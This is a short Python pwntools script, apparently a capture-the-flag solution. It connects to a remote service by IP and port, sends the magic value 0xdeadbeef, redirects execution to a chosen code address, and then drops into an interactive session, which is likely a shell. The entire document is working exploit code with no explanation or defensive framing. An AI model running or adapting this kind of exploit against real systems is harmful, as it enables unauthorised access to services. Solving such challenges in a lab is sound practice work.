from pwn import *

io=remote("35.221.144.41",10004)
payload1="\xef\xbe\xad\xde"
print payload1
io.recvuntil("Tell me your secret number again:\n")
io.send(payload1)
payload2="\xe6\x06\x40\x00"
print payload2
io.recvuntil("Oh, where to go?\n")
io.send(payload2)
io.interactive()